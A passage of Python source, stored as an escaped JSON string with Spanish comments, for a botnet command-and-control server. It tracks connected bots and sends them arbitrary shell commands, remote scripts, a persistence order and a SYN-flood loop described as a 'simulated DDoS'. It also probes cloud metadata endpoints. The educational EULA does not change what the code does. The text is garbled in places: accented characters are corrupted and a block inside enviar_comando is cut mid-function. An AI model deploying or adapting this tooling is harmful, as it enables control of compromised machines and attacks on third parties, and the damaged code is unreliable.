conn.close()\r\n        logging.info(f\"Respuesta del bot {bot_id} agregada a la base de datos.\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al agregar la respuesta del bot en la base de datos: {e}\")\r\n\r\ndef detectarEntornoCloud():\r\n    \r\n    \"\"\"\r\n    Detecta si el entorno actual es un entorno de cloud computing.\r\n\r\n    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para \r\n    determinar si el c贸digo se ejecuta en un entorno de nube. Si se logra \r\n    conectar exitosamente a cualquiera de estos servicios, se asume que el \r\n    entorno es un entorno de cloud y se devuelve True. En caso contrario, \r\n    se devuelve False.\r\n\r\n    Returns:\r\n        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.\r\n    \"\"\"\r\n    try:\r\n        try:\r\n            # AWS Metadata\r\n            if requests.get(\"http://169.254.169.254/latest/meta-data/\", timeout=1).status_code == 200:\r\n                logging.info(\"Entorno de cloud computing detectado.\")\r\n                return True\r\n        except requests.exceptions.RequestException:\r\n            pass\r\n\r\n        try:\r\n            # Google Cloud Metadata\r\n            if requests.get(\"http://metadata.google.internal/\", timeout=1).status_code == 200:\r\n                logging.info(\"Entorno de cloud computing detectado.\")\r\n                return True\r\n        except requests.exceptions.RequestException:\r\n            pass\r\n\r\n        return False\r\n    except Exception as e:\r\n        logging.error(f\"Error al detectar el entorno cloud: {e}\")\r\n        return False\r\n\r\ndef esRedPrivada(ip):\r\n    \"\"\"Indica si una IP es de una red privada o no.\r\n\r\n    La funci贸n intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve\r\n    el resultado de llamar a su m茅todo is_private(). Si la IP no es v谩lida,\r\n    devuelve False.\r\n\r\n    Parameters:\r\n    ip (str): La IP a verificar.\r\n\r\n    Returns:\r\n    bool: True si la IP es de una red privada, False si no lo es.\r\n    \"\"\"\r\n    try:\r\n        result = ipaddress.ip_address(ip).is_private\r\n        logging.info(f\"Verificaci贸n de red privada para la IP: {ip}\")\r\n        return result\r\n    except ValueError as e:\r\n        logging.error(f\"Error al verificar si la IP es privada: {e}\")\r\n        return False\r\n\r\ndef verificar_eula(tipo):\r\n    \"\"\"\r\n    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.\r\n    \r\n    :param tipo: \"servidor\" o \"cliente\" para determinar qu茅 EULA verificar.\r\n    \"\"\"\r\n    try:\r\n        if tipo not in [\"servidor\", \"cliente\"]:\r\n            raise ValueError(\"Tipo de EULA no v谩lido. Debe ser 'servidor' o 'cliente'.\")\r\n\r\n        # Ruta para el archivo EULA en la carpeta docs\r\n        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n        eula_path = os.path.join(BASE_DIR, \"..\", \"docs\", f\"eula_{tipo}.txt\")\r\n\r\n        # Si no existe, lo crea\r\n        if not os.path.exists(eula_path):\r\n            with open(eula_path, \"w\") as f:\r\n                f.write(\"ACCEPTED=False\")\r\n\r\n        # Leer si ya acept贸\r\n        with open(eula_path, \"r\") as f:\r\n            for linea in f:\r\n                if \"ACCEPTED=True\" in linea:\r\n                    logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n                    return True\r\n\r\n        # Mostrar Acuerdo de Licencia\r\n        print(\"\\n\" + \"=\"*50)\r\n        print(f\"  ACUERDO DE LICENCIA ({tipo.upper()}) \")\r\n        print(\"=\"*50)\r\n        print(\"\\nEste software es exclusivamente para prop贸sitos educativos y de investigaci贸n.\")\r\n        print(\"El uso en redes ajenas sin autorizaci贸n est谩 prohibido.\")\r\n        print(\"El usuario debe cumplir con las leyes de su pa铆s.\")\r\n        print(\"No se permite el uso de este software en redes p煤blicas.\")\r\n        print(\"El autor no se hace responsable del uso indebido.\\n\")\r\n        print(\"EL SOFTWARE NO FUNCIONAR FUERA DE UNA RED PRIVADA.\\n\")\r\n        \r\n        print(\"  QUEDA TERMINANTEMENTE PROHIBIDO:\")\r\n        print(\"   - Usarlo con intenciones maliciosas.\")\r\n        print(\"   - Ejecutarlo en infraestructuras cr铆ticas sin permiso.\")\r\n        print(\"   - Modificarlo para evadir restricciones.\")\r\n        print(\"   - Distribuirlo con fines ilegales o comerciales.\\n\")\r\n        \r\n        print(\"  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\\n\")\r\n        \r\n        respuesta = input(\"Escriba 'ACEPTO' para continuar: \").strip().upper()\r\n        \r\n        if respuesta == \"ACEPTO\":\r\n            with open(eula_path, \"w\") as f:\r\n                f.write(\"ACCEPTED=True\")\r\n            logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n            return True\r\n        else:\r\n            print(\"Debe aceptar la licencia para usar este software.\")\r\n            exit()\r\n    except Exception as e:\r\n        logging.error(f\"Error al verificar el EULA: {e}\")\r\n        exit()\r\n\r\ndef manejar_bot(conn, addr, bot_id, config):\r\n    \"\"\"\r\n    Maneja una conexi贸n de bot y la agrega o actualiza en la base de datos.\r\n\r\n    :param conn: El socket del bot conectado.\r\n    :type conn: socket.socket\r\n    :param addr: La direcci贸n IP y puerto del bot.\r\n    :type addr: tuple\r\n    :param bot_id: El ID del bot, que se usar谩 para identificarlo.\r\n    :type bot_id: int\r\n    :param config: Un objeto con la configuraci贸n del servidor.\r\n    \"\"\"\r\n    try:\r\n        ip, port = addr\r\n        hostname = socket.gethostbyaddr(ip)[0]\r\n        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n        print(f\"Bot {bot_id} conectado desde {addr}\")\r\n\r\n        # Recibir identificador 煤nico\r\n        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n        logging.info(f\"Identificador 煤nico recibido: {identificador}\")\r\n\r\n        # Detectar sistema operativo\r\n        try:\r\n            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n            os = \"windows\" if \"windows\" in os_info else \"linux\"\r\n            sistemas_operativos[conn] = os\r\n            print(f\"Bot {bot_id} identificado como {os.capitalize()}\")\r\n        except Exception as e:\r\n            print(f\"Error al detectar OS de {addr}: {e}\")\r\n            os = \"desconocido\"\r\n\r\n        agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)\r\n\r\n        while True:\r\n            try:\r\n                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n                if not data:\r\n                    continue\r\n\r\n                # Guardar la respuesta en el diccionario sin imprimirla\r\n                respuestas_bots[bot_id] = data\r\n                actualizar_bot_en_db(config, ip)\r\n                agregar_respuesta_en_db(config, bot_id, data)\r\n\r\n            except socket.timeout:\r\n                print(f\"Tiempo de espera agotado con {addr}.\")\r\n            except Exception as e:\r\n                print(f\"Error con {addr}: {e}\")\r\n                break\r\n\r\n        # Manejo de desconexi贸n\r\n        conn.close()\r\n        logging.info(f\"Bot {bot_id} desconectado\")\r\n        print(f\"Bot {bot_id} desconectado\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al manejar el bot {bot_id}: {e}\")\r\n    finally:\r\n        conn.close()\r\n        logging.info(f\"Bot {bot_id} desconectado\")\r\n        print(f\"Bot {bot_id} desconectado\")\r\n\r\ndef servidor_CnC(HOST, PORT):\r\n    global server_running\r\n    \"\"\"\r\n    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n    para aceptar conexiones y entra en un bucle para mostrar un men煤 principal\r\n    que permite al usuario interactuar con los bots conectados.\r\n\r\n    :return: None\r\n    \"\"\"\r\n    try:\r\n        logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket\r\n        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto\r\n        server.listen(5) # Escuchar conexiones\r\n        print(f\"Escuchando en {HOST}:{PORT}...\") # Imprimir que el servidor esta escuchando\r\n        \r\n        threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones\r\n\r\n        while server_running:\r\n            print(\"\\nMen煤 Principal:\")\r\n            print(\"1. Listar bots conectados\")\r\n            print(\"2. Enviar comandos\")\r\n            print(\"3. Cerrar conexi贸n con un bot\")\r\n            print(\"4. Salir\")\r\n            opcion = input(\"Seleccione una opci贸n: \")\r\n\r\n            if opcion == \"1\":\r\n                listar_bots()\r\n            elif opcion == \"2\":\r\n                menu_comandos()\r\n            elif opcion == \"3\":\r\n                cerrar_conexion_bots()\r\n            elif opcion == \"4\":\r\n                logging.info(\"Servidor CnC detenido\")\r\n                print(\"Saliendo de la consola...\")\r\n                server_running = False\r\n                server.close()\r\n                break\r\n            else:\r\n                print(\"Opci贸n no v谩lida. Intente de nuevo.\")\r\n        \r\n        # Esperar a que todos los hilos de bots terminen\r\n        for bot in bots:\r\n            bot.close()\r\n        for thread in threading.enumerate():\r\n            if thread is not threading.current_thread():\r\n                thread.join()\r\n    except Exception as e:\r\n        logging.error(f\"Error en el servidor CnC: {e}\")\r\n\r\ndef aceptar_conexiones(server):\r\n    global server_running\r\n    \"\"\"\r\n    Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n\r\n    Este hilo infinito espera conexiones de bots y las asigna a la lista de\r\n    bots conectados. A cada bot se le asigna un ID 煤nico y se crea un hilo\r\n    para manejar la conexi贸n. El hilo maneja_bot se encarga de recibir los\r\n    mensajes del bot, detectar el sistema operativo y ejecutar comandos\r\n    enviados por el usuario.\r\n\r\n    :param server: El socket del servidor C&C.\r\n    :type server: socket.socket\r\n    \"\"\"\r\n    try:\r\n        logging.info(\"Aceptando conexiones de bots\")\r\n        bot_id = 1 # Contador de bots\r\n        while server_running:\r\n            try:\r\n                conn, addr = server.accept() # Aceptar la conexi贸n\r\n                bots.append(conn) # Agregar el bot a la lista\r\n                bot_ids[conn] = bot_id # Asignar el ID del bot\r\n                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexi贸n\r\n                bot_id += 1 # Incrementar el contador de bots\r\n            except OSError:\r\n                if not server_running:\r\n                    break\r\n                else:\r\n                    raise\r\n    except Exception as e:\r\n        logging.error(f\"Error al aceptar conexiones: {e}\")\r\n\r\ndef listar_bots():\r\n    \"\"\"\r\n    Muestra la lista de bots conectados al servidor C&C, incluyendo\r\n    su identificador, sistema operativo y direcci贸n IP y puerto de\r\n    conexi贸n.\r\n    \r\n    :return: None\r\n    \"\"\"\r\n    try:\r\n        logging.info(\"Listando bots conectados\")\r\n        if bots:\r\n            print(\"\\nBots conectados:\")\r\n            for bot in bots: # Recorrer la lista de bots\r\n                so = sistemas_operativos.get(bot, \"Desconocido\") # Obtener el SO del bot\r\n                print(f\"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}\") # Imprimir el bot\r\n        else:\r\n            print(\"No hay bots conectados.\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al listar bots: {e}\")\r\n\r\ndef menu_comandos():\r\n    \r\n    \"\"\"\r\n    Muestra el men煤 de comandos disponibles para ejecutar en los bots\r\n    conectados y permite al usuario seleccionar una orden para ejecutar en\r\n    todos los bots o en algunos seleccionados manualmente.\r\n\r\n    :return: None\r\n    \"\"\"\r\n    try:\r\n        logging.info(\"Mostrando men煤 de comandos\")\r\n        if not bots:\r\n            print(\"No hay bots conectados.\")\r\n            return\r\n\r\n        print(\"\\nSeleccione el tipo de comandos:\")\r\n        print(\"1. Comandos b谩sicos\")\r\n        print(\"2. Comandos avanzados\")\r\n        tipo_comando = input(\"Ingrese su opci贸n: \")\r\n\r\n        if tipo_comando == \"1\":\r\n            print(\"\\nComandos b谩sicos disponibles:\")\r\n            print(\"1. Obtener informaci贸n del sistema\")\r\n            print(\"2. Consultar conexiones de red\")\r\n            print(\"3. Ver procesos en ejecuci贸n\")\r\n            print(\"4. Listar archivos en el directorio actual\")\r\n            print(\"5. Obtener la IP p煤blica\")\r\n            orden = input(\"Seleccione una orden: \")\r\n            comando_windows = \"\"\r\n            comando_linux = \"\"\r\n\r\n            if orden == \"1\":\r\n                comando_windows = \"systeminfo\"\r\n                comando_linux = \"uname -a && lsb_release -a\"\r\n            elif orden == \"2\":\r\n                comando_windows = \"netstat -ano\"\r\n                comando_linux = \"netstat -tunapl\"\r\n            elif orden == \"3\":\r\n                comando_windows = \"tasklist\"\r\n                comando_linux = \"ps aux\"\r\n            elif orden == \"4\":\r\n                comando_windows = \"dir\"\r\n                comando_linux = \"ls -lah\"\r\n            elif orden == \"5\":\r\n                comando_windows = \"curl ifconfig.me\"\r\n                comando_linux = \"curl ifconfig.me\"\r\n            else:\r\n                print(\"Opci贸n no v谩lida.\")\r\n                return\r\n\r\n            enviar_comando(comando_windows, comando_linux)\r\n\r\n        elif tipo_comando == \"2\":\r\n            print(\"\\nComandos avanzados disponibles:\")\r\n            print(\"1. Simular ataque DDoS\")\r\n            print(\"2. Detener simulaci贸n de DDoS\")\r\n            print(\"3. Ejecutar un comando personalizado\")\r\n            print(\"4. Ejecutar un script remoto\")\r\n            print(\"5. Intentar asegurar la persistencia\")\r\n            orden = input(\"Seleccione una orden: \")\r\n            comando_windows = \"\"\r\n            comando_linux = \"\"\r\n\r\n            if orden == \"1\":\r\n                objetivo = input(\"Ingrese la direcci贸n IP del objetivo: \")\r\n                puerto = input(\"Ingrese el puerto del objetivo: \")\r\n                protocolo = input(\"Ingrese el protocolo (TCP/UDP): \").upper()\r\n                if protocolo not in [\"TCP\", \"UDP\"]:\r\n                    print(\"Protocolo no v谩lido.\")\r\n                    return\r\n                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n            elif orden == \"2\":\r\n                comando_windows = \"stop_ddos\"\r\n                comando_linux = \"stop_ddos\"\r\n                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n            elif orden == \"3\":\r\n                comando_windows = input(\"Ingrese el comando personalizado para Windows: \")\r\n                comando_linux = input(\"Ingrese el comando personalizado para Linux: \")\r\n                enviar_comando(comando_windows, comando_linux)\r\n            elif orden == \"4\":\r\n                print(\"Seleccione el tipo de script:\")\r\n                print(\"1. Python\")\r\n                print(\"2. Bash\")\r\n                print(\"3. Otro (especificar)\")\r\n                \r\n                tipo = input(\"Ingrese la opci贸n: \")\r\n\r\n                if tipo == \"1\":\r\n                    extension = \"py\"\r\n                    interprete_linux = \"python3 -c\"\r\n                    interprete_windows = \"python -c\"\r\n                elif tipo == \"2\":\r\n                    extension = \"sh\"\r\n                    interprete_linux = \"bash -c\"\r\n                    interprete_windows = \"powershell -Command\"\r\n                elif tipo == \"3\":\r\n                    extension = input(\"Ingrese la extensi贸n del script (ejemplo: ps1, rb, pl): \")\r\n                    interprete_linux = input(\"Ingrese el comando para ejecutarlo en Linux: \")\r\n                    interprete_windows = input(\"Ingrese el comando para ejecutarlo en Windows: \")\r\n                else:\r\n                    print(\"Opci贸n inv谩lida.\")\r\n                    return\r\n\r\n                print(\"\\n驴C贸mo desea proporcionar el script?\")\r\n                print(\"1. Escribirlo aqu铆\")\r\n                print(\"2. Proporcionar la ruta de un archivo\")\r\n                \r\n                metodo = input(\"Ingrese la opci贸n: \")\r\n\r\n                if metodo == \"1\":\r\n                    print(f\"Escriba su script en {extension}. Finalice con 'EOF' en una l铆nea nueva:\")\r\n                    lineas = []\r\n                    while True:\r\n                        try:\r\n                            linea = input()\r\n                            if linea.strip().upper() == \"EOF\":  # Detectar EOF\r\n                                break\r\n                            lineas.append(linea)\r\n                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir\r\n                            print(\"\\nEntrada cancelada.\")\r\n                            return\r\n                    script = \"\\n\".join(lineas)  # Unir l铆neas en una sola cadena\r\n                elif metodo == \"2\":\r\n                    ruta = input(\"Ingrese la ruta del archivo: \")\r\n                    try:\r\n                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n                            script = archivo.read()\r\n                    except Exception as e:\r\n                        print(f\"Error al leer el archivo: {e}\")\r\n                        return\r\n                else:\r\n                    print(\"Opci贸n inv谩lida.\")\r\n                    return\r\n\r\n                # Reemplazar comillas para evitar problemas con la ejecuci贸n remota\r\n                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n\r\n                comando_windows = f'{interprete_windows} \"{script}\"'\r\n                comando_linux = f\"{interprete_linux} '{script}'\"\r\n\r\n                enviar_comando(comando_windows, comando_linux)\r\n            elif orden == \"5\":\r\n                print(\"\\nIntentando asegurar la persistencia en los bots seleccionados...\")\r\n                comando_windows = \"persistencia\"\r\n                comando_linux = \"persistencia\"\r\n                enviar_comando(comando_windows, comando_linux)\r\n            else:\r\n                print(\"Opci贸n no v谩lida.\")\r\n                return\r\n        else:\r\n            print(\"Opci贸n no v谩lida.\")\r\n            return\r\n    except Exception as e:\r\n        logging.error(f\"Error en el men煤 de comandos: {e}\")\r\n\r\ndef enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n    \r\n    \"\"\"\r\n    Env铆a un comando a un conjunto de bots seleccionados.\r\n\r\n    :param comando_windows: El comando a enviar a los bots Windows.\r\n    :type comando_windows: str\r\n    :param comando_linux: El comando a enviar a los bots Linux.\r\n    :type comando_linux: str\r\n    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n    :type tipo_comando: str\r\n    \"\"\"\r\n    try:\r\n        logging.info(\"Enviando comando a los bots seleccionados\")\r\n                    print(\"ID de bot no v谩lido.\")\r\n                    return\r\n            except ValueError:\r\n                print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n                return\r\n        elif seleccion == \"5\":\r\n            listar_bots()\r\n            try:\r\n                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n                if not bots_seleccionados:\r\n                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n                    return\r\n            except ValueError:\r\n                print(\"Entrada inv谩lida. Debe ingresar n煤meros separados por comas.\")\r\n                return\r\n        else:\r\n            print(\"Opci贸n no v谩lida.\")\r\n            return\r\n\r\n        respuestas = {}\r\n\r\n        for bot in bots_seleccionados:\r\n            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n\r\n        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n        for bot, respuesta in respuestas.items():\r\n            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n            print(f\"[] {bot_info}: {respuesta}\")\r\n\r\n        print(\"\\n--- Volviendo al men煤 principal ---\\n\")\r\n        time.sleep(2)\r\n    except Exception as e:\r\n        logging.error(f\"Error al enviar comando: {e}\")\r\n\r\ndef enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n    \r\n    \"\"\"\r\n    Env铆a un comando a un bot espec铆fico basado en su sistema operativo.\r\n\r\n    Determina el sistema operativo del bot y env铆a el comando adecuado \r\n    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n    m谩ximo definido y devuelve la respuesta si se recibe. Maneja la \r\n    desconexi贸n del bot si ocurre durante la comunicaci贸n.\r\n\r\n    :param bot: El socket del bot al que se enviar谩 el comando.\r\n    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n    :type tipo_comando: str\r\n    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n             respuesta o si el bot se desconecta.\r\n    \"\"\"\r\n    try:\r\n        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n        so = sistemas_operativos.get(bot, \"desconocido\")\r\n        comando = comando_windows if so == \"windows\" else comando_linux\r\n        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n\r\n        try:\r\n            bot.send(comando.encode('utf-8'))\r\n            print(f\"\\n[] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n\r\n            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n            tiempo_maximo = 5  # Segundos\r\n            tiempo_inicial = time.time()\r\n\r\n            while time.time() - tiempo_inicial < tiempo_maximo:\r\n                if bot_id in respuestas_bots:\r\n                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n                    if tipo_comando == \"ddos_start\":\r\n                        ddos_status[bot_id] = \"running\"\r\n                    elif tipo_comando == \"ddos_stop\":\r\n                        ddos_status[bot_id] = \"stopped\"\r\n                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n\r\n            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n\r\n        except (socket.error, BrokenPipeError):\r\n            print(f\"[] Bot {bot_id} desconectado.\")\r\n            if bot in bots:\r\n                bots.remove(bot)\r\n            if bot in bot_ids:\r\n                del bot_ids[bot]\r\n            if bot in sistemas_operativos:\r\n                del sistemas_operativos[bot]\r\n            return \"[ERROR] El bot se ha desconectado.\"\r\n    except Exception as e:\r\n        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n\r\ndef cerrar_conexion_bots():\r\n    \r\n    \"\"\"\r\n    Cierra la conexi贸n con un bot seleccionado por el usuario.\r\n    \r\n    El usuario puede seleccionar a los bots a los que quiere cerrar la conexi贸n\r\n    mediante un ID o bien escribir \"todos\" para cerrar la conexi贸n con todos\r\n    los bots conectados.\r\n    \r\n    :return: None\r\n    \"\"\"\r\n    try:\r\n        logging.info(\"Cerrando conexi贸n con los bots seleccionados\")\r\n        if not bots:\r\n            print(\"No hay bots conectados.\")\r\n            return\r\n\r\n        listar_bots()\r\n        \r\n        try:\r\n            bot_id = int(input(\"Seleccione el ID del bot cuya conexi贸n quiere cerrar: \")) # Obtener el ID del bot seleccionado\r\n        except ValueError:\r\n            print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n            return\r\n\r\n        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente\r\n        \r\n        if not bot: # Si no se encuentra el bot\r\n            print(f\"ID de bot {bot_id} no v谩lido.\") # Imprimir un mensaje de error\r\n            return\r\n\r\n        try:\r\n            bot.close() # Cerrar la conexi贸n\r\n            print(f\"Conexi贸n con el bot {bot_id} cerrada.\") # Imprimir un mensaje de confirmaci贸n\r\n        except Exception as e:\r\n            print(f\"Error al cerrar la conexi贸n con el bot {bot_id}: {e}\")\r\n\r\n        if bot in bots:\r\n            bots.remove(bot) # Eliminar el bot de la lista\r\n\r\n        if bot in bot_ids:\r\n            del bot_ids[bot] # Eliminar el ID del bot\r\n\r\n        if bot in sistemas_operativos:\r\n            del sistemas_operativos[bot] # Eliminar el SO del bot\r\n\r\n        print(f\"Bot {bot_id} eliminado correctamente del sistema.\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al cerrar conexi贸n con los bots: {e}\")\r\n\r\ndef cargar_configuracion():\r\n    \r\n    \"\"\"\r\n    Carga la configuraci贸n del servidor desde un archivo \"config.ini\" ubicado\r\n    en el directorio \"config\" del proyecto.\r\n\r\n    La configuraci贸n se almacena en un objeto con las siguientes claves:\r\n        * BASE_DIR: Directorio base del proyecto.\r\n        * HOST: Direcci贸n IP del servidor.\r\n        * PORT: Puerto de escucha del servidor.\r\n        * MAX_CONNECTIONS: N煤mero m谩ximo de conexiones permitidas.\r\n        * DB_PATH: Ruta del archivo de la base de datos.\r\n        * SECRET_KEY: Clave secreta para la autenticaci贸n.\r\n        * HASH_ALGORITHM: Algoritmo de hash para la autenticaci贸n.\r\n        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).\r\n        * SERVER_LOG_FILE: Ruta del archivo de log.\r\n\r\n    Si no se encuentra el archivo de configuraci贸n o hay un error al leerlo,\r\n    se muestra un mensaje de error y se sale del programa con un estado de\r\n    error.\r\n\r\n    :return: Un objeto con la configuraci贸n cargada.\r\n    \"\"\"\r\n    try:\r\n        logging.info(\"Cargando configuraci贸n del servidor\")\r\n        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n        CONFIG_DIR = os.path.join(BASE_DIR, \"..\", \"config\")\r\n        CONFIG_PATH = os.path.join(CONFIG_DIR, \"config.ini\")\r\n\r\n        if not os.path.exists(CONFIG_PATH):\r\n            raise FileNotFoundError(f\"[ERROR] No se encontr贸 el archivo de configuraci贸n: {CONFIG_PATH}\")\r\n\r\n        config = configparser.ConfigParser()\r\n        config.read(CONFIG_PATH)\r\n\r\n        return {\r\n            \"BASE_DIR\": BASE_DIR,\r\n            \"HOST\": config.get(\"NETWORK\", \"HOST\"),\r\n            \"PORT\": config.getint(\"NETWORK\", \"PORT\"),\r\n            \"MAX_CONNECTIONS\": config.getint(\"NETWORK\", \"MAX_CONNECTIONS\"),\r\n            \"DB_PATH\": os.path.join(BASE_DIR, config.get(\"DATABASE\", \"DB_PATH\")),\r\n            \"SECRET_KEY\": config.get(\"SECURITY\", \"SECRET_KEY\"),\r\n            \"HASH_ALGORITHM\": config.get(\"SECURITY\", \"HASH_ALGORITHM\"),\r\n            \"LOG_LEVEL\": config.get(\"LOGGING\", \"LOG_LEVEL\"),\r\n            \"SERVER_LOG_FILE\": os.path.join(BASE_DIR, \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n        }\r\n    except Exception as e:\r\n        logging.error(f\"Error al cargar la configuraci贸n: {e}\")\r\n        exit(1)\r\n\r\ndef iniciar_servidor():\r\n    \"\"\"\r\n    Inicializa el servidor de Comando y Control (C2) verificando primero\r\n    que no se ejecute en una red privada y mostrando un aviso de EULA.\r\n\r\n    Luego, inicializa la base de datos, configura el sistema de logging y\r\n    lanza el servidor de C2.\r\n\r\n    :return: None\r\n    \"\"\"\r\n    try:\r\n        logging.info(\"Iniciando servidor de Comando y Control (C2)\")\r\n        config = cargar_configuracion()\r\n        configurar_logging(config)  # Pasar el objeto de configuraci贸n en lugar de la cadena\r\n        if not esRedPrivada(config[\"HOST\"]):\r\n            input(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.\")\r\n            sys.exit(1)\r\n        verificar_eula(\"servidor\")\r\n        init_db(config[\"DB_PATH\"])\r\n        servidor_CnC(config[\"HOST\"], config[\"PORT\"])\r\n        logging.info(\"Servidor de Comando y Control (C2) iniciado correctamente\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al iniciar el servidor: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        iniciar_servidor()\r\n    except Exception as e:\r\n        logging.error(f\"Error en la ejecuci贸n principal: {e}\")"
        }
    ]
}